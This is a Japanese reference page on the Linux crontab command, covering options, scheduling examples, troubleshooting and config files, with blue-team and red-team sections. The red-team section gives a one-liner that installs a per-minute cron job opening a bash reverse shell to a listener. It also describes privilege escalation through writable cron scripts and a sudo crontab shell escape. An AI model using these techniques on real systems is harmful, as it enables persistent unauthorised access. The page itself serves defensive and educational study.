# Command - Linux - crontab - 定期的なジョブ（タスク）実行をスケジュールする

## 概要

`crontab` は、バックグラウンドで常駐するデーモン `cron` (または `crond`) に対して、指定した日時や間隔でコマンドやスクリプトを自動実行させるための設定ファイルを管理するコマンドです。ユーザーごとに個別の設定を持つことができます。

(出自: `cron` または `cronie` パッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| `at` | 一度限りの予約実行。定期実行はできない。 | 単発のタスク |
| `anacron` | 24時間稼働していないマシン（PC等）向け。停止中に実行漏れしたジョブを起動時に補完する。 | 非常時稼働マシン |
| `systemd.timer` | systemd環境の現代的代替。依存関係の管理やログ出力の制御がより高度。 | モダンなシステム管理 |
| `crontab` | 伝統的で設定が非常に簡単。どのディストリビューションでもほぼ共通。 | 汎用的な定期タスク |

## よく連携されるコマンド

### シナリオ例: 実行結果のログ記録と通知 (運用視点)

* **目的**: 定期実行されたスクリプトの出力をファイルに保存し、エラー時に気付けるようにする。
* **連携コマンド**: `logger`, リダイレクト (`>>`)
* **解説**: cronは標準出力をメールで送ろうとしますが、適切にリダイレクトして syslog やファイルに記録するのが一般的です。
* **コマンド例**:
    ```bash
    # 毎日午前3時にバックアップを実行し、ログを記録
    0 3 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
    ```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **基本操作** | |
| ⭐️ `-e`, `--edit` | 現在のユーザーの crontab ファイルを編集する（環境変数 `EDITOR` で指定したエディタが開く）。 |
| ⭐️ `-l`, `--list` | 現在のユーザーの crontab 設定を表示する。 |
| `-r`, `--remove` | 現在のユーザーの crontab 設定をすべて削除する。 |
| **管理者用** | |
| `-u <user>` | 指定したユーザーの crontab を操作する（root権限が必要）。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: SSL証明書の自動更新（Certbot等）やディスククリーンアップ。
* **組み合わせ**: `crontab -e` による設定。
* **解説**: 証明書の期限切れを防ぐため、週に一度などの頻度で更新コマンドを自動実行させます。
* **例**:
    ```bash
    # 毎週月曜の深夜0時に証明書更新を試行
    0 0 * * 1 /usr/bin/certbot renew --quiet
    ```

### 2. ブルーチーム視点

* **タスク**: 侵害調査における「予期せぬ自動実行タスク」の検知。
* **組み合わせ**: `crontab -l -u <user>` およびシステムディレクトリの確認。
* **解説**: ユーザー個別の設定だけでなく、`/etc/cron.*` ディレクトリや `/etc/crontab` に不審なスクリプトが登録されていないか網羅的に調査します。
* **例**:
    ```bash
    # 全ユーザーの crontab を一覧表示して不審な行を検索
    for user in $(cut -f1 -d: /etc/passwd); do echo "User: $user"; crontab -u $user -l 2>/dev/null; done
    ```

### 3. レッドチーム視点

* **タスク**: 永続化（Persistence）のためのリバースシェルの仕込み。
* **組み合わせ**: `(crontab -l; echo "...") | crontab -`
* **解説**: 1分ごとに攻撃者のリスナーへ接続しにいくジョブを登録します。エディタを開かずに標準入力から設定を上書き（追加）する手法がよく使われます。
* **例**:
    ```bash
    # 1分ごとにリバースシェルを実行する設定を追加
    (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'") | crontab -
    ```

## エラーメッセージとトラブルシューティング

1.  **エラーメッセージ例 1**: `crontab: install via suid: Permission denied`
    * **考えられる原因**: `/usr/bin/crontab` の SUID ビットが異常、または `/etc/cron.allow`, `/etc/cron.deny` による制限。
    * **解決策**: `/etc/cron.allow` に自分のユーザー名を追加する。

2.  **ジョブが実行されない**:
    * **考えられる原因**: 環境変数（特に `PATH`）が不足している。cronは最小限の環境変数で実行されます。
    * **解決策**: コマンドをフルパス（例: `/usr/bin/python3`）で書くか、crontabの冒頭に `PATH=/usr/bin:/bin` 等を記述する。

## 環境変数と設定ファイル

### 影響を与える環境変数

* **`EDITOR`**: `crontab -e` で起動するエディタ（vi, nano 等）。
* **`MAILTO`**: 実行結果（出力）を送信するメールアドレス。空にするとメールを送信しません。

### 関連する設定ファイル

* **`/var/spool/cron/crontabs/`**: ユーザーごとの crontab 本体が保存される場所。
* **`/etc/crontab`**: システム全体のスケジュール。
* **`/etc/cron.d/`**: パッケージ導入時などに追加される設定ファイル群。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: 書き込み権限のあるディレクトリ内にあるスクリプトを cron が root で実行している場合、そのスクリプトを書き換えることで root 権限を奪取可能（Privilege Escalation）。
* **悪用シナリオ**: 攻撃者が `ls -l /etc/cron.daily` を確認し、一般ユーザーが書き込み可能なスクリプトを発見。そこに自身のコードを追記し、翌日の実行を待つ。

### GTFOBins における利用例

`crontab` が `sudo` で実行可能な場合、設定を編集する際に任意のエディタを介してシェルを起動できます。

* **機能**: `Sudo`
* **コマンド例**:
    ```bash
    # sudo crontab を実行し、エディタ内からシェルを起動 (:!/bin/sh)
    sudo crontab -e
    ```
* **参照**: `https://gtfobins.github.io/gtfobins/crontab/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: cron で実行されるスクリプト自体のパーミッションを厳格に管理する。
* **Detection (検知)**: `/var/spool/cron/crontabs/` 配下のファイル変更を `auditd` で監視する。

## 注意点・補足

* **改行の重要性**: crontabファイルの末尾には必ず空行（改行）が必要です。これがないと、最後の行が読み飛ばされる実装があります。
* **特殊な記述**: `0 0 * * *` の代わりに `@daily`、`@reboot`（起動時に実行）といったショートカット記法も利用可能です。
